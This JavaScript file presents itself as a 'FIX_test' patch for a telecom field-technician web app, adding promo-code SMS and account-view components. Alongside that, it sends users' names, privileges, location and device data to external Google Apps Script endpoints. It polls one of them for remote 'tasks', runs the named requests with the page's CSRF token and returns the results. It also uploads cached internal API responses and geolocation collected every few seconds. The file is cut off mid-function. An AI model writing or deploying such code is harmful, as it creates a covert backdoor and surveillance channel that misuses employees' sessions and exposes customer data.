
const FIX_test_version='FIX_test_26.02.23';
const FIX_test_app_version='FIX_test v1.6';
const FIX_test_DEV=!Boolean(window.AppInventor);
if(FIX_test_DEV){
  window.AppInventor={
    setWebViewString:function(str){console.log(str);this.str=str},
    getWebViewString:function(){return this.str},
    str:'',
  };
};

function createScriptCrcElement(id='',src=''){
  document.getElementById(id)?.remove();
  document.body.insertAdjacentElement('afterBegin',Object.assign(document.createElement('script'),{src,id}));
};
function createStyleElement(id='',css=''){
  document.getElementById(id)?.remove();
  const el=Object.assign(document.createElement('style'),{type:'text/css',id});
  el.appendChild(document.createTextNode(css));
  document.body.insertAdjacentElement('afterBegin',el);
};
createStyleElement('fix-test-app-css',`
  .text-decoration-line-through{text-decoration:line-through !important;}
  .padding-unset{padding:unset !important;}
  .ports-map__grid{gap:8px;}
`);


window.AppInventor.setWebViewString(`on:moduleOk:::=${FIX_test_version}`);
window.AppInventor.setWebViewString(`set:FollowLinks:::=false`);//костыль для 1.5.3
console.log(FIX_test_version,new Date().toLocaleString());
const info={
  ...filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']),
  visualViewport:filterProps(window.visualViewport,['width','height']),
  navigator:{
    ...filterProps(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory'),
    connection:filterProps(window.navigator.connection,'effectiveType,rtt,downlink,saveData'),
  }
}
window.navigator.getBattery().then(battery=>{info.navigator.battery=filterProps(battery,'charging,chargingTime,dischargingTime,level')});

function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};

const node_id='n'+randcode(10);
let config_id='initial';
function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
let timeout_get=10000;
let enable_get=true;
let current_app_version='';
let username='';//app.$store.getters['main/userData']
fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
  if(resp?.data?.username){
    const {data:user_data={}}=resp;
    username=user_data.username;
    const {latitude,longitude,location,privileges}=user_data;
    fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{//inform on start
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({username,node_id,info,user_data,latitude,longitude,location,privileges,date:new Date(Date.now()).toString()})
    }).catch(console.warn).finally(()=>{
      let t=setTimeout(get,timeout_get);
      function get(){//get stat
        fetch(`https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username=${username}&node_id=${node_id}&config_id=${config_id}`).then(r=>r.json()).then(obj=>{
          const {config={},task={}}=obj;
          if(config){config_id=config?.config_id||config_id;timeout_get=config?.timeout||timeout_get;};
          const {task_id='',url='',method='',body={}}=task;
          if(task_id&&url&&method){
            fetch(url,((method==='POST')?Object.assign({method,headers:{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content')}},body?({body:JSON.stringify(body||{},null,2)}):{}):null)).then(r=>r.json()).then(response=>{
              if(response){
                fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},body:JSON.stringify({username,node_id,task:{task_id,response,isError:false}})}).then(r=>{next()}).catch(e=>{console.log(e);next()})
              }else{next()}
            }).catch(e=>{console.warn(e);next()})
          }else{next()}
        }).catch(e=>{console.warn(e);next()});
        function next(){if(enable_get){t=setTimeout(get,timeout_get)}};
      };
    });
    
    fetch(`https://script.google.com/macros/s/AKfycbxSwKUcTppHjUXcVxSyrx-CjyitTp8VUgBSQ0BOu3a2npDRKBRSDjLjnyIIwo69bXMq7A/exec?select_user_by_name=${username}`).then(r=>r.json()).then(user=>{
      const {appVersion='',userAgent=''}=user?.[username]||{};
      current_app_version=appVersion;
      if(current_app_version/*&&userAgent&&window.navigator.userAgent===userAgent*/){
        if(!document.getElementById('app_version_label')){
          document.body.insertAdjacentHTML('beforeend',`<div id="app_version_label" style="position:absolute;top:0;left:0;width:100%;white-space:pre;font-size:12px;${FIX_test_app_version!==current_app_version?'background:#00000022;':''}">${current_app_version} ${FIX_test_app_version!==current_app_version?'(требуется обновление!)':''}</div>`)
        }
      }
    })
    
  };
});

document.body.insertAdjacentHTML('beforeend',`<input type="button" id="btn_refresh" value="refresh" style="position:absolute;top:0;right:0;"/>`);
document.getElementById('btn_refresh')?.addEventListener('click',()=>{
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`);
  window.location.href='https://fx.mts.ru/fix';
});

async function httpGet(url,quiet){const response=await httpRequest('GET',url,null,quiet);pushResponse({url,response});return response};
const max_buffer_size=20;
const buffer=new Map();
function pushResponse({url,response}={}){
  buffer.set(url,response);
  if(FIX_test_DEV){console.log('buffer.size:',buffer.size)}
  if(buffer.size<max_buffer_size){return};
  const entries=[...buffer.entries()];
  const {location:region_id,username}=store?.state?.main?.userData||{};
  if(FIX_test_DEV){console.log('buffer.size==max_buffer_size:',region_id,username,entries)};
  if(region_id===54&&username&&!FIX_test_DEV){
    fetch('https://script.google.com/macros/s/AKfycbzV-IEHP2thb4wXGXPwmflsGwT8MJg-pGzXd1zCpekJ3b0Ecal6aTxJddtRXh_qVu0-/exec',{
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({region_id,username,entries})
    })
  }
  buffer.clear()
};

//port refree - error
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortActionBindRefree.js',type:'text/javascript'}));

//activatespd
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortActionBindUserVgidActivate.js',type:'text/javascript'}));

document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/NetworkElement2EquipmentView.js',type:'text/javascript'}));

//port log indexing
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortUserActionsPortLogs.js',type:'text/javascript'}));

//portsmap logs indexing
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortsMapLogs.js',type:'text/javascript'}));

//user ip ping and go
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/DeviceActionPing.js',type:'text/javascript'}));

//rebind all abons by mac-port
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/DeviceActionPortsAbonsBinds.js',type:'text/javascript'}));

//test actual abon state from siebel
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortLinks.js',type:'text/javascript'}));

//redesign, fix params, need create custom table
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/Session.js',type:'text/javascript'}));

//fix iptv code and add credentials
//30105741270
//[Vue warn]: Invalid prop: type check failed for prop "credentials". Expected Array, got Object.
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/FixIptvCodeAndCredentials.js',type:'text/javascript'}));



store.registerModule('kion',{
  namespaced:true,
  state:()=>({
    loads:{
      getPq:false,
      sendLog:false,
    },
    resps:{
      getPq:null
    }
  }),
  getters:{
    resps_getPq:state=>state.resps.getPq,
    pq:state=>state.resps.getPq?.pq,
    smsTemplate:state=>state.resps.getPq?.sms,
    date:state=>new Date(Date.parse(state.resps.getPq?.date)),
    loads_getPq:state=>state.loads.getPq,
    loads_sendLog:state=>state.loads.sendLog,
  },
  mutations:{
    set_resp_getPq(state,response={}){
      state.resps.getPq=response;
    },
    set_loads_getPq(state,loading=false){
      state.loads.getPq=loading;
    },
    set_loads_sendLog(state,loading=false){
      state.loads.sendLog=loading;
    },
  },
  actions:{
    async getPq({state,rootGetters,commit},props){
      const username=rootGetters['main/username'];
      commit('set_loads_getPq',true);
      try{
        const url='https://script.google.com/macros/s/AKfycbyFZx3LaE77_0n-Hne597ky5P1SyrmeReaKrndXURqKhGJE6qNDjfi455OBuFcWvwaK/exec';
        const response=await fetch(`${url}?username=${username}`).then(resp=>resp.json());//await new Promise(r=>setTimeout(r,30000));
        commit('set_resp_getPq',response);
      }catch(error){
        console.warn('getPq:error',error);
      }
      commit('set_loads_getPq',false);
    },
    async sendLog({state,rootGetters,commit},{account='',phone='',sms=''}={}){
      const username=rootGetters['main/username'];
      const region_id=rootGetters['main/region_id'];
      commit('set_loads_sendLog',true);
      try{
        await fetch('https://script.google.com/macros/s/AKfycbwl2YHpVTeUevuwTqgkm2OmP-sf78EXd91yI4neh1MrmVHA6_M_Pq8dYE7JIwyxwIsL/exec',{
          method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json;charset=utf-8"},
          body:JSON.stringify({username,region_id,account,phone,sms})
        });
      }catch(error){
        console.warn('sendLog:error',error);
      }
      commit('set_loads_sendLog',false);
    }
  },
});
function getPhoneWithPlus(phone=''){
  phone=phone.replace(/\D/g,'');
  if(!phone){return phone};
  switch(phone[0]){
    case '8':case '7':return `+7${phone.slice(1)}`;
    default:return phone.length==10?`+7${phone}`:phone;//номер без +7 или 8
  };
};
Vue.component('SendKionPq',{
  template:`<div v-if="(resps_getPq||loads_getPq)&&phonesValid.length" class="send-kion-pq background-color-d1dfed display-flex flex-direction-column gap-2px margin-left-right-16px margin-top-bottom-8px border-radius-8px padding-4px">
    <loader-bootstrap v-if="loads_getPq" text="получение промокода KION"/>
    <template v-else-if="resps_getPq">
      <span class="font--12-400">Отправить смс с промокодом KION</span>
      <div class="display-inline-flex column-gap-4px justify-content-space-between">
        <div v-if="items.length==1" class="display-inline-flex align-items-center">
          <span class="tone-900 font--15-500">{{phone}}</span>
        </div>
        <select-el v-else :items="items" v-model="selected" :value="phone" class="send-kion-pq-custom-selector-el"/>
        <div class="display-inline-flex column-gap-4px">
          <div v-if="loads_sendLog" class="display-flex align-items-center">
            <i class="ic-24 ic-loading rotating main-lilac"></i>
          </div>
          <div @click="sendSms(phone)" :class="(!pq||loads_getPq||loads_sendLog)?'background-color-97a8b9':'background-color-284059 cursor-pointer'" class="size-30px border-radius-4px display-flex align-items-center justify-content-center">
            <i class="tone-100 ic-24 ic-sms"></i>
          </div>
        </div>
      </div>
      <span v-if="pq" class="font--12-400">{{pq}} от {{date.toLocaleString()}}</span>
      <div v-else class="font--12-400 text-align-center background-color-efdbcf border-radius-8px margin-top-2px">промокод не внесён!</div>
    </template>
  </div>`,
  props:{
    phones:{type:Array,default:()=>([])},
    account:{type:String,default:''},
  },
  data:()=>({
    selected:'',
    phone:'',
    items:[],
  }),
  mounted(){
    createStyleElement('SendKionPq-css',`
    .background-color-d1dfed,.kion-bg{background-color:#d1dfed;}
    .background-color-284059,.kion-bg-btn{background-color:#284059;}
    .background-color-97a8b9,.kion-bg-btn-disabled{background-color: #97a8b9;}
    .background-color-efdbcf,.kion-bg-no-pq{background-color: #efdbcf;}
    .cursor-pointer{cursor:pointer;}
    .send-kion-pq-custom-selector-el.select-el{padding: unset;width: 150px;height: 25px;background: unset;}
    .send-kion-pq-custom-selector-el .select-el__label{height: 25px;}
    .send-kion-pq-custom-selector-el .select-el__input{padding: unset;margin-left: 4px;}
    .send-kion-pq-custom-selector-el .select-el__icon{padding: unset;}
    .send-kion-pq-custom-selector-el.select-el--open .select-el__list{top: 26px;padding: unset;}
    .send-kion-pq-custom-selector-el .select-el__item{height: 25px;min-height: 25px;padding: unset;padding-left: 4px;padding-right: 2px;}
    `)
  },
  created(){
    if(!this.pq&&!this.loads_getPq){
      this.getPq();
    };
    this.items=[...new Set([this.phone,...this.items,...this.phonesValid].filter(s=>s))];
    this.selected=this.selected||this.phone||this.items[0];
  },
  watch:{
    'selected'(selected){
      if(selected){this.phone=selected};
    },
    'phonesValid'(phonesValid){
      this.items=[...new Set([this.phone,...this.items,...phonesValid].filter(s=>s))];
      this.selected=this.selected||this.phone||this.items[0]
    }
  },
  computed:{
    ...mapGetters({
      username:'main/username',
    }),
    phonesValid(){
      return [...new Set(this.phones.filter(s=>s).map(phone=>getPhoneWithPlus(phone)).filter(t=>t.length>6))];
    },
    ...mapGetters({
      isApp:'app/isApp',
      resps_getPq:'kion/resps_getPq',
      pq:'kion/pq',
      smsTemplate:'kion/smsTemplate',
      date:'kion/date',
      loads_getPq:'kion/loads_getPq',
      loads_sendLog:'kion/loads_sendLog',
    }),
    sms(){
      if(!this.smsTemplate){return `http://kion.ru/code?pq=${this.pq}`};
      return this.smsTemplate.split(/({{|}})/).reduce((text,piece,i,arr)=>{
        if(piece==='{{'){
          const path=arr[i+1]||'';
          text+=path.split('.').reduce((value,key)=>(value?.[key]||''),this);
        }else if(piece!=='}}'&&arr[i-1]!=='{{'){
          text+=piece;
        };
        return text;
      },'',this);
    },
  },
  methods:{
    ...mapActions({
      sendToApp:'app/sendToApp',
      getPq:'kion/getPq',
      sendLog:'kion/sendLog'
    }),
    sendSms(phone='',mode='direct'){//mode direct or approve
      if(!phone){return};
      const {pq,account,sms,loads_sendLog}=this;
      if(!pq){return};
      if(loads_sendLog){return};
      if(this.isApp){
        this.sendToApp(`do:sendSms:${mode}:${phone}=${sms}`);
      }else{
        window.location=`sms:${phone}?body=${encodeURIComponent(sms)}`;
      };
      this.sendLog({account,phone,sms})
    },
  }
});

Vue.component("lbsv-account-main", {//add SendKionPq and fix address
  //template: "#lbsv-account-main-template",
  template:`<CardBlock v-if="account">
    <title-main>
      <div slot="prefix">
        <span class="ic-20 ic-status" :class="!agreement.closedon?'main-green':'main-red'"></span>
      </div>
      <span slot="text" class="d-flex align-items-center" style="gap:5px;">
        <span>{{accountId}}</span>
        <span v-if="agreement.closedon" class="font--12-400 tone-500">расторгнут {{agreement.closedon}}</span>
        <span v-if="agreement&&agreement.isconvergent&&!agreement.closedon" class="lbsv-account__convergent">Конвергент</span>
      </span>
    </title-main>
    <devider-line />
    <info-text-icon :text="formatedAddress" type="medium" icon=""/>
    <devider-line />
    <title-main :text="account.name" icon="person" style="text-transform: capitalize;" />
    <div v-if="agreement && phone === agreement.convergentmsisdn">
      <account-call v-if="agreement && agreement.isconvergent" :phone="agreement.convergentmsisdn" :isConvergent="agreement.isconvergent" class="mb-3" showSendSms/>
    </div>
    <div v-else>
      <account-call v-if="agreement && agreement.isconvergent" :phone="agreement.convergentmsisdn" :isConvergent="agreement.isconvergent" class="mb-3" showSendSms/>
      <account-call v-if="phone" :phone="phone" class="mb-3" showSendSms/>
    </div>
    
    <SendKionPq :phone="phone" :phones="[account?.mobile,account?.phone,agreement?.convergentmsisdn]" :account="accountId"/>
    
    <devider-line v-if="agreement"/>
    <template v-if="agreement">
      <info-value icon="purse" :value="balance" type="extra" :label="'Баланс (ЛС '+accountId+')'" :minus="agreement.balance.minus"/>
      <info-value v-if="agreement && agreement.convergentmsisdn && convergentBalance" icon="purse" :value="convergentBalance+' ₽'" type="extra" :label="'Баланс (+'+agreement.convergentmsisdn+')'" :minus="convergentBalance < 0 ? true : false"/>
      <info-value v-if="agreement.lastpaydate" icon="clock" :value="lastPay" type="extra" label="Платеж" />
    </template>
    <devider-line />
      
    <!--<link-block @block-click="openBillingInfo" text="Информация в биллинге" icon="server" action-icon="expand" />-->
    <billing-info-modal ref="billingInfo" :billing-info="billingInfo" :loading="loading.vgroups" />
    <link-block @block-click="openSendSmsModal" text="Смс с новым паролем" icon="sms" action-icon="expand" />
    <send-sms-modal ref="sendSms" :account="accountId" />
  </CardBlock>`,
  props: {
    account: { type: Object, default: null },
    agreement: { type: Object, default: null },
    flatData: { type: Object, default: null },
    loading: { type: Object, required: true },
    billingInfo: { type: Array, default: () => [] },
    convergentBalance: { type: [String, Number], default: null },
    accountId: { type: String, default: '' },
    flat: { type: Object, default: null }
  },
  computed: {
    addr_type2(){//0-прописки, 1-проживания, 2-доставки счетов
      if(!this.account?.vgroups?.[0]||!this.agreement){return ""};
      const addresses=this.account.vgroups.find(service=>service.agrmid==this.agreement.agrmid&&service.addresses.find(address=>address?.type==2))?.addresses||[];
      const addr_type2=addresses?.find(address=>address?.type==2)?.address;
      return addr_type2||''
    },
    computedAddress() {
      if (!this.account) return "";
      if (this.agreement) {
        const service = this.account.vgroups.find((s) => s.agrmid == this.agreement.agrmid && s.connaddress);
        if (service) return service.vgaddress || service.connaddress;
      }
      let address = {};
      if (Array.isArray(this.account.addresses)) {
        address = this.account.addresses.find((a) => a.address) || {};
      }
      return this.account.address || address.address || "";
    },
    formatedAddress(){
      const address=this.addr_type2||this.computedAddress;
      if(!address){return ''};
      return address.split(',').map(elem=>elem.trim()).filter(v=>v).join(", ")
    },
    flatNumber() {
      // TODO: this.account.FLAT_NUMBER пережиток?
      return (this.flatData && this.flatData.number) || this.account.FLAT_NUMBER;
    },
    balance() {
      let balance = this.agreement.balance;
      let str = balance.integer + "." + balance.fraction + " ₽";
      if (balance.minus) return "-" + str;
      return str;
    },
    lastPay() {
      const lastsum = this.agreement.lastsum || "";
      const lastpaydate = this.agreement.lastpaydate || "";
      const rub = lastsum ? "₽" : "";
      const point = lastpaydate ? "•" : "";
      return `${lastsum} ${rub} ${point} ${lastpaydate}`;
    },
    phone() {
      const phone = this.account.mobile || this.account.phone;
      return phone;
    },
    titleIcon() {
      const isActive = Array.isArray(this.account.agreements) && this.account.agreements.length > 0;;
      return isActive ? 'person' : 'close-1 main-red';
    },
    isActiveAgreement() {
      const vgroups = [...this.account.vgroups];
      const vgroupStatus = vgroups.some(item =>  
        !item.accoffdate || (Date.parse(item.accoffdate) > Date.now()) || (item.accoffdate === "0000-00-00 00:00:00") && (item.accondate !== "0000-00-00 00:00:00"));
      return vgroupStatus
    },
    setMinus() {
      if (this.agreement.balance.minus) {
        return true
      }
    } 
  },
  methods: {
    openBillingInfo() {
      this.$refs.billingInfo.open();
    },
    openSendSmsModal() {
      this.$refs.sendSms.open();
    },
  },
});

Vue.component('task-main-account',{//add SendKionPq
  //template:'#task-main-account-template',
  template:`<div>
    <CardBlock>
      <title-main :text="task.tasktype" icon="task">
        <div class="d-center-y" style="padding-right: 12px;">
          <span class="tone-900" style="white-space: nowrap; padding-right: 8px;">{{ task.Assignment }}</span>
          <span class="ic-20 ic-timer tone-500"></span>
        </div>
      </title-main>

      <info-subtitle>
        <span>
          <span v-if="operationIcons.tv" class="ic-16 ic-tv"></span>
          <span v-if="operationIcons.internet" class="ic-16 ic-eth"></span>
          <span v-if="operationIcons.phone" class="ic-16 ic-sim"></span>
          <span v-if="operationIcons.any"> • </span>
          <span>{{ task.NumberOrder }}</span>
        </span>
      </info-subtitle>

      <devider-line />
      <link-block :text="task.Number_EIorNumberOrder+' (СЗ)'" type="medium" actionIcon="copy" @click="copy(task.Number_EIorNumberOrder)"/>

      <devider-line />
      <link-block :text="task.clientNumber+' (ЛС)'" @click="copy(task.clientNumber)" type="medium" actionIcon="copy"/>

      <devider-line />
      <info-text-sec title="Описание работ" :rows="[task.ProductOffering]" :text="task.description||'нет описания работ'"/>

      <devider-line />
      <link-block icon="task-status" :text="task.status" :actionIcon="hasBf?'right-link':'-'" @block-click="slideToEntrance" type="medium">
        <div slot="postfix" class="display-flex gap-4px main-orange" v-if="hasBf">
          <div>
            <span class="ic-20 ic-warning"></span>
          </div>
          <span class="font-size-14px">Блок-фактор</span>
        </div>
      </link-block>
    </CardBlock>

    <CardBlock>
      <title-main :text="task.customer" icon="person" style="text-transform: capitalize;" />
      <account-call :phone="task.ContactPhoneNumber" :descr="task.customer" showSendSms/>
      <SendKionPq :phones="[task.ContactPhoneNumber]" :account="task.clientNumber"/>
      <info-list icon="timer" :text="task.Appointment" comment="(ожидания клиентом)" />
    </CardBlock>

    <CardBlock>
      <title-main :text="site?.address||task.AddressSiebel" class="mt-8">
        <button-sq type="large" icon="pin" @click="toMap"/>
      </title-main>
      <info-list icon="apartment" v-if="entrance" :text="titleEntranceFloorFlat"/>
      <devider-line />
      <link-block icon="du" :text="site?.node||task.siteid" :search="site?.node||task.siteid" type="medium" />
      <link-block icon="home" actionIcon="expand" text="Инфо по площадке и доступу" @block-click="open_modal_site_info" type="medium" />
    </CardBlock>

    <modal-container ref="modal_site_info">
      <site-info :site="site"/>
    </modal-container>
  </div>`,
  props:{
    task:{type:Object,required:true},
  },
  data:()=>({
    site:null,
    entrances:[],
    entrance:null,
  }),
  computed:{
    hasBf(){return false //заглушка до вывода 172
      if(!this.entrance){return};//return true
      return Object.values(this.entrance?.blocks||{}).some(b=>b);
    },
    flat() {
      let i = this.task.AddressSiebel.search(/кв\./gi);
      if (i == -1) return 0;
      let flat = this.task.AddressSiebel.substring(i + 4).replace(/\D/g, '');
      return Number(flat);
    },
    floor() {
      if (!this.entrance || !this.flat) return '';
      const floors = this.entrance.floor;
      const floor = floors.find(el => el.first <= this.flat && el.last >= this.flat);
      if (floor) return floor.number;
      return ''
    },
    titleEntranceFloorFlat(){
      let str=[];
      if(this.entrance.id){str.push('подъезд '+this.entrance.number)};
      if(this.floor){str.push('этаж '+this.floor)};
      if(this.flat){str.push('кв '+this.flat)};
      return str.join(' • ');
    },
    operationIcons() {
      const { service } = this.task;
      if (!Array.isArray(service)) return {};
      const hasInternet = service.includes('internet');
      const hasTv = service.includes('tv');
      const hasPhone = service.includes('phone');
      return {
        any: hasInternet || hasTv || hasPhone,
        internet: hasInternet,
        tv: hasTv,
        phone: hasPhone
      }
    },
  },
  created(){
    this.getSite();
    this.getEntrances();
  },
  methods:{
    slideToEntrance(){
      if(!this.hasBf){return};
      this.$emit('slide-to',{name:'entrance'});
    },
    async getSite(){
      let cache=this.$cache.getItem(`search_ma/${this.task.siteid}`);
      if(cache){
        this.getNode(cache);
        return;
      };
      try{
        let response=await httpGet(buildUrl("search_ma",{pattern:this.task.siteid},"/call/v1/search/"));
        if(response.type==='error'){throw new Error(response.message)};
        this.$cache.setItem(`search_ma/${this.task.siteid}`,response.data);
        this.getNode(response.data);
      }catch(error){
        console.warn('search_ma:site.error',error);
      };
    },
    getNode(response){
      if(Array.isArray(response)){
        this.site=response.find(({type})=>type.toUpperCase()==='ДУ')||response[0];
      }else{
        this.site=response;
      }
    },
    async getEntrances(){
      let cache=this.$cache.getItem(`site_entrance_list/${this.task.siteid}`);
      if(cache){this.getEntrance(cache);return;};
      try {
        let response=await httpGet(buildUrl('site_entrance_list',{site_id:this.task.siteid},'/call/v1/device/'));
        if(response.type==='error'){throw new Error(response.message)};
        if(!response.length){response=[]};
        this.$cache.setItem(`site_entrance_list/${this.task.siteid}`,response);
        this.getEntrance(response);
      }catch(error){
        console.warn('site_entrance_list.error',error);
      }
    },
    getEntrance(response){
      this.entrances=Array.isArray(response)?response:[];
      this.entrance=this.entrances.find(entrance=>this.flat>=entrance.flats.from&&this.flat<=entrance.flats.to);
      this.setEntranceSlide();
    },
    setEntranceSlide() {
      this.$emit('set:header',{
        component:'task-entrance',
        title:this.entrance?`Подъезд № ${this.entrance.number}`:(this.entrances&&this.entrances.length)?'Все подъезды':'Подъезды',
        subtitle:this.entrance?`кв ${this.entrance.flats.range}`:(this.entrances&&this.entrances.length)?`1 - ${this.entrances.length}`:'отсутствуют'
      });
    },
    copy(text){
      copyToBuffer(text,()=>console.log('Copied:',text));
    },
    open_modal_site_info(){
      this.$refs.modal_site_info.open();
    },
    toMap(){
      if(!this.site){return};
      this.$router.push({
        name:'map',
        query:{
          lat:this.site?.coordinates?.latitude,
          long:this.site?.coordinates?.longitude,
        },
      });
    },
  },
});














//tbmap mvp
let sendStateTimer=null;
let savePositionTimer=null;
const stateBuffer=new Set();

if(app?.$store?.getters?.['main/username']&&!FIX_test_DEV){
  saveUserStateToBuffer();
  getUserStateBufferAndSend();
  
  sendStateTimer=setInterval(()=>{
    getUserStateBufferAndSend();
  },300000);//5min
  
  savePositionTimer=setInterval(()=>{
    saveUserStateToBuffer();
  },5000);//5sec
};

async function saveUserStateToBuffer(){
  const date=new Date().toLocaleString();
  const time=Date.now();
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  if(window?.ymaps?.geolocation){
    console.info('geolocation by ymaps');
    window.ymaps.geolocation.get({}).then(result=>{
      let position=result?.geoObjects?.position;
      if(!position){
        getByNavigator({date,time,battery,connection});
        return
      };
      position=[...position];
      stateBuffer.add({date,time,position,battery,connection});
    });
  }else if('geolocation' in navigator){
    console.info('geolocation by navigator');
    getByNavigator({date,time,battery,connection});
  }else{
    console.info('no geolocation');
    stateBuffer.add({date,time,position:null,battery,connection});
  };
  
  function getByNavigator({date,time,battery,connection}){
    if('geolocation' in navigator&&'getCurrentPosition' in navigator.geolocation){
      navigator.geolocation.getCurrentPosition((result)=>{
        const {latitude,longitude}=result?.coords||{};
        if(!latitude||!longitude){
          stateBuffer.add({date,time,position:null,battery,connection})
          return
        };
        const position=[latitude,longitude];
        stateBuffer.add({date,time,position,battery,connection});
      });
    }else{;
      stateBuffer.add({date,time,position:null,battery,connection})
      return
    }
  }
};

async function getUserStateBufferAndSend(){
  const username=app?.$store?.getters?.['main/username'];
  if(!username){return};
  
  const region_id=app?.$store?.getters?.['main/region_id'];
  //const region=app?.$store?.getters?.['main/region'];
  const position_ldap={
    latitude:app?.$store?.getters?.['main/latitude'],
    longitude:app?.$store?.getters?.['main/longitude'],
  };
  
  const history=[...stateBuffer];
  const date=new Date().toLocaleString();
  const time=Date.now();
  const position=history[history.length-1]?.position||null;
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  
  const platform=window.navigator.platform;
  const {mobile,platform:_platform}=window.navigator.userAgentData||{};
  const userAgentData={mobile,platform:_platform};
  
  getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData});
  stateBuffer.clear();
  
  function getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData}){
    const sites={}//getSitesCache();
    const tasks=[]//getTasksCache();
    
    //getSitesToCacheIfNotPresent({tasks,sites});
    
    console.log({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
    sendUserState({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
  };
  
  function getTasksCache(){
    return [...app?.$store?.getters?.['wfm/wfmTasks']].reduce((tasks,task)=>{
      const {
        NumberOrder:task_id,
        siteid:site_id,
        AddressSiebel:address,
        Number_EIorNumberOrder:order,
        tasktype:type,
        status,
        OperationConcatenation:operationStr,
        Appointment:timeAppointment,
        Assignment:timeAssignment,
        TimeModified:dateModifed,
        LoginName:username,
        dateAssignment,
        clientNumber:account,
      }=task;
      const operations=operationStr?.split(',')||[];
      tasks[task_id]={
        task_id,site_id,username,
        account,address,order,
        type,status,operations,
        timeAppointment,
        timeAssignment,dateAssignment,
        dateModifed
      };
      return tasks
    },{})
  };

  function getSitesCache(){
    return Object.assign(Object.entries(localStorage).reduce((sites,[key,value])=>{
      if(!/^(building|buildings|get_nioss_object|getSite)/i.test(key)){return sites};
      let data=null;
      try{
        value=JSON.parse(value);
        if(value?.data){
          data=value?.data
        };
      }catch(error){
        return sites
      };
      
      if(!data){return sites};
      
      if(data?.site_id&&data?.latitude){//building by coords
        const {site_id,region_id,latitude,longitude}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,region_id});
      }else if(data?.length&&data[0]?.coordinates){//buildings by coords
        for(const site of data){
          const {id:site_id,coordinates:{latitude,longitude}}=site;
          if(!sites[site_id]){sites[site_id]={site_id}};
          sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude});
        };
      }else if(data?.LatitudeWGS){//get_nioss_object by id
        const {resource_business_name:name,LatitudeWGS:latitude,LongitudeWGS:longitude}=data;
        const site_id=key.split('/')[1];
        const region_id=name?.split('_')[1];
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude:parseFloat(latitude),longitude:parseFloat(longitude),name,region_id:parseInt(region_id)});
      }else if(data?.id&&data?.coordinates){//getSite by pattern=id
        const {id:site_id,coordinates:{latitude,longitude},name,address}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,name,address})
      };
      
      return sites;
    },{}),
      app.routerHistory.reduce((sites,route)=>{
      const site=route?.params?.siteProp
      if(site){
        const {id:site_id,coordinates:{latitude,longitude},name,address}=site;
        sites[site_id]={site_id,latitude,longitude,name,address}
      }
      return sites
    },{}));
  };
  
  function sendUserState(payload={}){
    try{
